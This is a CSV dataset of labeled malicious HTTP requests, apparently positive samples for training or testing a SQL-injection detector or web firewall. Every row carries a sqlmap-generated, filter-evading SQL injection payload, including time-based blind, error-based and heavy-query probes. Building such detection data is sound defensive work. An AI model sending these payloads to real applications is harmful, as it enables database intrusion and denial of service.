"id","label","source","source_url","method","url","path","query_string","headers","body","raw_request","notes"
"pos_modsec_learn_sqli_002475","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%29%2F%2A%2A%2FaS%2F%2A%2A%2FdrHE%2F%2A%2A%2FWhere%2F%2A%2A%2F8562%3D8562%2F%2A%2A%2FOr%2F%2A%2A%2FupdAtExml%282868%2CCoNCAT%28CHAR%2846%29%2CCONCAT%28CHAR%28113%29%2CCHAR%2898%29%2CCHAR%28122%29%2CCHAR%28106%29%2CCHAR%28113%29%29%2C%28sElecT%2F%2A%2A%2F%28eLt%282868%3D2868%2C1%29%29%29%2CCONCAT%28CHAR%28113%29%2CCHAR%28118%29%2CCHAR%28106%29%2CCHAR%28112%29%2CCHAR%28113%29%29%29%2C2386%29--%2F%2A%2A%2Fvjec","/","p=%27%29%29%2F%2A%2A%2FaS%2F%2A%2A%2FdrHE%2F%2A%2A%2FWhere%2F%2A%2A%2F8562%3D8562%2F%2A%2A%2FOr%2F%2A%2A%2FupdAtExml%282868%2CCoNCAT%28CHAR%2846%29%2CCONCAT%28CHAR%28113%29%2CCHAR%2898%29%2CCHAR%28122%29%2CCHAR%28106%29%2CCHAR%28113%29%29%2C%28sElecT%2F%2A%2A%2F%28eLt%282868%3D2868%2C1%29%29%29%2CCONCAT%28CHAR%28113%29%2CCHAR%28118%29%2CCHAR%28106%29%2CCHAR%28112%29%2CCHAR%28113%29%29%29%2C2386%29--%2F%2A%2A%2Fvjec","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%29%2F%2A%2A%2FaS%2F%2A%2A%2FdrHE%2F%2A%2A%2FWhere%2F%2A%2A%2F8562%3D8562%2F%2A%2A%2FOr%2F%2A%2A%2FupdAtExml%282868%2CCoNCAT%28CHAR%2846%29%2CCONCAT%28CHAR%28113%29%2CCHAR%2898%29%2CCHAR%28122%29%2CCHAR%28106%29%2CCHAR%28113%29%29%2C%28sElecT%2F%2A%2A%2F%28eLt%282868%3D2868%2C1%29%29%29%2CCONCAT%28CHAR%28113%29%2CCHAR%28118%29%2CCHAR%28106%29%2CCHAR%28112%29%2CCHAR%28113%29%29%29%2C2386%29--%2F%2A%2A%2Fvjec HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002476","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%29%2F%2A%2A%2FaS%2F%2A%2A%2FgWCY%2F%2A%2A%2FWhERE%2F%2A%2A%2F2280%3D2280%2F%2A%2A%2FAnd%2F%2A%2A%2F4970%3DlIKE%28CHaR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUppER%28hEx%28RAndOMBLOB%28500000000%2F2%29%29%29%29--","/","p=%27%29%29%2F%2A%2A%2FaS%2F%2A%2A%2FgWCY%2F%2A%2A%2FWhERE%2F%2A%2A%2F2280%3D2280%2F%2A%2A%2FAnd%2F%2A%2A%2F4970%3DlIKE%28CHaR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUppER%28hEx%28RAndOMBLOB%28500000000%2F2%29%29%29%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%29%2F%2A%2A%2FaS%2F%2A%2A%2FgWCY%2F%2A%2A%2FWhERE%2F%2A%2A%2F2280%3D2280%2F%2A%2A%2FAnd%2F%2A%2A%2F4970%3DlIKE%28CHaR%2865%2C66%2C67%2C68%2C69%2C70%2C71%29%2CUppER%28hEx%28RAndOMBLOB%28500000000%2F2%29%29%29%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002477","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%29%2F%2A%2A%2FaS%2F%2A%2A%2Fgyfc%2F%2A%2A%2FWHErE%2F%2A%2A%2F7666%3D7666%3BsElECt%2F%2A%2A%2FDBMS_PIPE.reCEivE_MeSSaGe%28cHr%28107%29%7C%7CcHr%28102%29%7C%7CcHr%2885%29%7C%7CcHr%2882%29%2C5%29%2F%2A%2A%2FfROm%2F%2A%2A%2FdUal--","/","p=%27%29%29%2F%2A%2A%2FaS%2F%2A%2A%2Fgyfc%2F%2A%2A%2FWHErE%2F%2A%2A%2F7666%3D7666%3BsElECt%2F%2A%2A%2FDBMS_PIPE.reCEivE_MeSSaGe%28cHr%28107%29%7C%7CcHr%28102%29%7C%7CcHr%2885%29%7C%7CcHr%2882%29%2C5%29%2F%2A%2A%2FfROm%2F%2A%2A%2FdUal--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%29%2F%2A%2A%2FaS%2F%2A%2A%2Fgyfc%2F%2A%2A%2FWHErE%2F%2A%2A%2F7666%3D7666%3BsElECt%2F%2A%2A%2FDBMS_PIPE.reCEivE_MeSSaGe%28cHr%28107%29%7C%7CcHr%28102%29%7C%7CcHr%2885%29%7C%7CcHr%2882%29%2C5%29%2F%2A%2A%2FfROm%2F%2A%2A%2FdUal-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002478","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%29%2F%2A%2A%2FaS%2F%2A%2A%2FsFyR%2F%2A%2A%2FWhEre%2F%2A%2A%2F6557%3D6557%2F%2A%2A%2FOr%2F%2A%2A%2F7830%3D%28seLect%2F%2A%2A%2FcOunt%28%2A%29%2F%2A%2A%2FfROM%2F%2A%2A%2FgenERAtE_sERies%281%2C5000000%29%29--%2F%2A%2A%2FKRaL","/","p=%27%29%29%2F%2A%2A%2FaS%2F%2A%2A%2FsFyR%2F%2A%2A%2FWhEre%2F%2A%2A%2F6557%3D6557%2F%2A%2A%2FOr%2F%2A%2A%2F7830%3D%28seLect%2F%2A%2A%2FcOunt%28%2A%29%2F%2A%2A%2FfROM%2F%2A%2A%2FgenERAtE_sERies%281%2C5000000%29%29--%2F%2A%2A%2FKRaL","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%29%2F%2A%2A%2FaS%2F%2A%2A%2FsFyR%2F%2A%2A%2FWhEre%2F%2A%2A%2F6557%3D6557%2F%2A%2A%2FOr%2F%2A%2A%2F7830%3D%28seLect%2F%2A%2A%2FcOunt%28%2A%29%2F%2A%2A%2FfROM%2F%2A%2A%2FgenERAtE_sERies%281%2C5000000%29%29--%2F%2A%2A%2FKRaL HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002479","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2F3544%3D%28SEleCt%2F%2A%2A%2FcOUnt%28%2A%29%2F%2A%2A%2FfrOm%2F%2A%2A%2FGeNEraTe_SErIes%281%2C5000000%29%29--","/","p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2F3544%3D%28SEleCt%2F%2A%2A%2FcOUnt%28%2A%29%2F%2A%2A%2FfrOm%2F%2A%2A%2FGeNEraTe_SErIes%281%2C5000000%29%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2F3544%3D%28SEleCt%2F%2A%2A%2FcOUnt%28%2A%29%2F%2A%2A%2FfrOm%2F%2A%2A%2FGeNEraTe_SErIes%281%2C5000000%29%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002480","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2F5155%3D%28seLecT%2F%2A%2A%2FCounT%28%2A%29%2F%2A%2A%2FFROm%2F%2A%2A%2FINFoRMATION_SCHEMA.coluMns%2F%2A%2A%2FA%2C%2F%2A%2A%2FINFoRMATION_SCHEMA.coluMns%2F%2A%2A%2FB%2C%2F%2A%2A%2FINFoRMATION_SCHEMA.coluMns%2F%2A%2A%2FC%2F%2A%2A%2FwHErE%2F%2A%2A%2F0%2F%2A%2A%2FXoR%2F%2A%2A%2F1%29%23","/","p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2F5155%3D%28seLecT%2F%2A%2A%2FCounT%28%2A%29%2F%2A%2A%2FFROm%2F%2A%2A%2FINFoRMATION_SCHEMA.coluMns%2F%2A%2A%2FA%2C%2F%2A%2A%2FINFoRMATION_SCHEMA.coluMns%2F%2A%2A%2FB%2C%2F%2A%2A%2FINFoRMATION_SCHEMA.coluMns%2F%2A%2A%2FC%2F%2A%2A%2FwHErE%2F%2A%2A%2F0%2F%2A%2A%2FXoR%2F%2A%2A%2F1%29%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2F5155%3D%28seLecT%2F%2A%2A%2FCounT%28%2A%29%2F%2A%2A%2FFROm%2F%2A%2A%2FINFoRMATION_SCHEMA.coluMns%2F%2A%2A%2FA%2C%2F%2A%2A%2FINFoRMATION_SCHEMA.coluMns%2F%2A%2A%2FB%2C%2F%2A%2A%2FINFoRMATION_SCHEMA.coluMns%2F%2A%2A%2FC%2F%2A%2A%2FwHErE%2F%2A%2A%2F0%2F%2A%2A%2FXoR%2F%2A%2A%2F1%29%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002481","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2F6035%3D%28chAR%28113%29%7C%7CchAR%2898%29%7C%7CchAR%28122%29%7C%7CchAR%28106%29%7C%7CchAR%28113%29%7C%7C%28caSE%2F%2A%2A%2FWhen%2F%2A%2A%2F%286035%3D6035%29%2F%2A%2A%2FThen%2F%2A%2A%2FchAR%2849%29%2F%2A%2A%2FElsE%2F%2A%2A%2FchAR%2848%29%2F%2A%2A%2FeND%29%7C%7CchAR%28113%29%7C%7CchAR%28118%29%7C%7CchAR%28106%29%7C%7CchAR%28112%29%7C%7CchAR%28113%29%29%2F%2A%2A%2FaND%2F%2A%2A%2F%28%28%27HxTZ%27%3D%27HxTZ","/","p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2F6035%3D%28chAR%28113%29%7C%7CchAR%2898%29%7C%7CchAR%28122%29%7C%7CchAR%28106%29%7C%7CchAR%28113%29%7C%7C%28caSE%2F%2A%2A%2FWhen%2F%2A%2A%2F%286035%3D6035%29%2F%2A%2A%2FThen%2F%2A%2A%2FchAR%2849%29%2F%2A%2A%2FElsE%2F%2A%2A%2FchAR%2848%29%2F%2A%2A%2FeND%29%7C%7CchAR%28113%29%7C%7CchAR%28118%29%7C%7CchAR%28106%29%7C%7CchAR%28112%29%7C%7CchAR%28113%29%29%2F%2A%2A%2FaND%2F%2A%2A%2F%28%28%27HxTZ%27%3D%27HxTZ","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2F6035%3D%28chAR%28113%29%7C%7CchAR%2898%29%7C%7CchAR%28122%29%7C%7CchAR%28106%29%7C%7CchAR%28113%29%7C%7C%28caSE%2F%2A%2A%2FWhen%2F%2A%2A%2F%286035%3D6035%29%2F%2A%2A%2FThen%2F%2A%2A%2FchAR%2849%29%2F%2A%2A%2FElsE%2F%2A%2A%2FchAR%2848%29%2F%2A%2A%2FeND%29%7C%7CchAR%28113%29%7C%7CchAR%28118%29%7C%7CchAR%28106%29%7C%7CchAR%28112%29%7C%7CchAR%28113%29%29%2F%2A%2A%2FaND%2F%2A%2A%2F%28%28%27HxTZ%27%3D%27HxTZ HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002482","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2F8000%3D%28seleCT%2F%2A%2A%2FcOUNT%28%2A%29%2F%2A%2A%2FfROM%2F%2A%2A%2Fsysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys1%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys2%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys3%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys4%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys5%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys6%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys7%29--","/","p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2F8000%3D%28seleCT%2F%2A%2A%2FcOUNT%28%2A%29%2F%2A%2A%2FfROM%2F%2A%2A%2Fsysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys1%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys2%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys3%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys4%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys5%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys6%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys7%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2F8000%3D%28seleCT%2F%2A%2A%2FcOUNT%28%2A%29%2F%2A%2A%2FfROM%2F%2A%2A%2Fsysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys1%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys2%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys3%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys4%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys5%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys6%2Csysusers%2F%2A%2A%2FAs%2F%2A%2A%2Fsys7%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002483","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2FCHar%28101%29%7C%7CCHar%2890%29%7C%7CCHar%2869%29%7C%7CCHar%28104%29%3DReGExp_SUBStriNG%28rEPEat%28LEFt%28CRYpt_keY%28CHar%2865%29%7C%7CCHar%2869%29%7C%7CCHar%2883%29%2CNulL%29%2C0%29%2C500000000%29%2CNulL%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28%28%27WqVU%27%3D%27WqVU","/","p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2FCHar%28101%29%7C%7CCHar%2890%29%7C%7CCHar%2869%29%7C%7CCHar%28104%29%3DReGExp_SUBStriNG%28rEPEat%28LEFt%28CRYpt_keY%28CHar%2865%29%7C%7CCHar%2869%29%7C%7CCHar%2883%29%2CNulL%29%2C0%29%2C500000000%29%2CNulL%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28%28%27WqVU%27%3D%27WqVU","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2FCHar%28101%29%7C%7CCHar%2890%29%7C%7CCHar%2869%29%7C%7CCHar%28104%29%3DReGExp_SUBStriNG%28rEPEat%28LEFt%28CRYpt_keY%28CHar%2865%29%7C%7CCHar%2869%29%7C%7CCHar%2883%29%2CNulL%29%2C0%29%2C500000000%29%2CNulL%29%2F%2A%2A%2FANd%2F%2A%2A%2F%28%28%27WqVU%27%3D%27WqVU HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002484","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2FcHAR%2898%29%7C%7CcHAR%2868%29%7C%7CcHAR%28118%29%7C%7CcHAR%2876%29%3DreGExp_SuBStriNG%28repEAT%28rIgHt%28cHAR%288614%29%2C0%29%2C5000000000%29%2CnulL%29--","/","p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2FcHAR%2898%29%7C%7CcHAR%2868%29%7C%7CcHAR%28118%29%7C%7CcHAR%2876%29%3DreGExp_SuBStriNG%28repEAT%28rIgHt%28cHAR%288614%29%2C0%29%2C5000000000%29%2CnulL%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%29%2F%2A%2A%2FoR%2F%2A%2A%2FcHAR%2898%29%7C%7CcHAR%2868%29%7C%7CcHAR%28118%29%7C%7CcHAR%2876%29%3DreGExp_SuBStriNG%28repEAT%28rIgHt%28cHAR%288614%29%2C0%29%2C5000000000%29%2CnulL%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002485","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%29%3BSElECt%2F%2A%2A%2FbENcHmARk%285000000%2CMD5%28CONCAT%28CHAR%2897%29%2CCHAR%2865%29%2CCHAR%2881%29%2CCHAR%2873%29%29%29%29%23","/","p=%27%29%29%3BSElECt%2F%2A%2A%2FbENcHmARk%285000000%2CMD5%28CONCAT%28CHAR%2897%29%2CCHAR%2865%29%2CCHAR%2881%29%2CCHAR%2873%29%29%29%29%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%29%3BSElECt%2F%2A%2A%2FbENcHmARk%285000000%2CMD5%28CONCAT%28CHAR%2897%29%2CCHAR%2865%29%2CCHAR%2881%29%2CCHAR%2873%29%29%29%29%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002486","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%29%3BSElEcT%2F%2A%2A%2FsLeep%285%29%23","/","p=%27%29%29%3BSElEcT%2F%2A%2A%2FsLeep%285%29%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%29%3BSElEcT%2F%2A%2A%2FsLeep%285%29%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002487","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%29%3BSelECT%2F%2A%2A%2F%28cASE%2F%2A%2A%2FWhen%2F%2A%2A%2F%284477%3D8047%29%2F%2A%2A%2FThEN%2F%2A%2A%2F1%2F%2A%2A%2FelSE%2F%2A%2A%2F4477%2A%28SelECT%2F%2A%2A%2F4477%2F%2A%2A%2FuniOn%2F%2A%2A%2FAlL%2F%2A%2A%2FSelECT%2F%2A%2A%2F8047%29%2F%2A%2A%2FEnd%29--","/","p=%27%29%29%3BSelECT%2F%2A%2A%2F%28cASE%2F%2A%2A%2FWhen%2F%2A%2A%2F%284477%3D8047%29%2F%2A%2A%2FThEN%2F%2A%2A%2F1%2F%2A%2A%2FelSE%2F%2A%2A%2F4477%2A%28SelECT%2F%2A%2A%2F4477%2F%2A%2A%2FuniOn%2F%2A%2A%2FAlL%2F%2A%2A%2FSelECT%2F%2A%2A%2F8047%29%2F%2A%2A%2FEnd%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%29%3BSelECT%2F%2A%2A%2F%28cASE%2F%2A%2A%2FWhen%2F%2A%2A%2F%284477%3D8047%29%2F%2A%2A%2FThEN%2F%2A%2A%2F1%2F%2A%2A%2FelSE%2F%2A%2A%2F4477%2A%28SelECT%2F%2A%2A%2F4477%2F%2A%2A%2FuniOn%2F%2A%2A%2FAlL%2F%2A%2A%2FSelECT%2F%2A%2A%2F8047%29%2F%2A%2A%2FEnd%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002488","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%29%3BcreATe%2F%2A%2A%2FoR%2F%2A%2A%2FrEpLAcE%2F%2A%2A%2FfuNCtIoN%2F%2A%2A%2FSlEeP%28Int%29%2F%2A%2A%2FretuRns%2F%2A%2A%2FInt%2F%2A%2A%2FAs%2F%2A%2A%2F%27%2Flib%2Flibc.so.6%27%2C%27slEEp%27%2F%2A%2A%2FLANguaGE%2F%2A%2A%2F%27C%27%2F%2A%2A%2FSTRICT%3B%2F%2A%2A%2FSeLEcT%2F%2A%2A%2FslEEp%285%29--","/","p=%27%29%29%3BcreATe%2F%2A%2A%2FoR%2F%2A%2A%2FrEpLAcE%2F%2A%2A%2FfuNCtIoN%2F%2A%2A%2FSlEeP%28Int%29%2F%2A%2A%2FretuRns%2F%2A%2A%2FInt%2F%2A%2A%2FAs%2F%2A%2A%2F%27%2Flib%2Flibc.so.6%27%2C%27slEEp%27%2F%2A%2A%2FLANguaGE%2F%2A%2A%2F%27C%27%2F%2A%2A%2FSTRICT%3B%2F%2A%2A%2FSeLEcT%2F%2A%2A%2FslEEp%285%29--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%29%3BcreATe%2F%2A%2A%2FoR%2F%2A%2A%2FrEpLAcE%2F%2A%2A%2FfuNCtIoN%2F%2A%2A%2FSlEeP%28Int%29%2F%2A%2A%2FretuRns%2F%2A%2A%2FInt%2F%2A%2A%2FAs%2F%2A%2A%2F%27%2Flib%2Flibc.so.6%27%2C%27slEEp%27%2F%2A%2A%2FLANguaGE%2F%2A%2A%2F%27C%27%2F%2A%2A%2FSTRICT%3B%2F%2A%2A%2FSeLEcT%2F%2A%2A%2FslEEp%285%29-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
"pos_modsec_learn_sqli_002489","1","modsec_learn_sqli","malicious/sqlmap/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=%27%29%29%3BseLect%2F%2A%2A%2FDBMS_PIPE.RecEiVe_MessAge%28Chr%28107%29%7C%7CChr%28102%29%7C%7CChr%2885%29%7C%7CChr%2882%29%2C5%29%2F%2A%2A%2FFrOm%2F%2A%2A%2FDUal--","/","p=%27%29%29%3BseLect%2F%2A%2A%2FDBMS_PIPE.RecEiVe_MessAge%28Chr%28107%29%7C%7CChr%28102%29%7C%7CChr%2885%29%7C%7CChr%2882%29%2C5%29%2F%2A%2A%2FFrOm%2F%2A%2A%2FDUal--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=%27%29%29%3BseLect%2F%2A%2A%2FDBMS_PIPE.RecEiVe_MessAge%28Chr%28107%29%7C%7CChr%28102%29%7C%7CChr%2885%29%7C%7CChr%2882%29%2C5%29%2F%2A%2A%2FFrOm%2F%2A%2A%2FDUal-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqlmap"
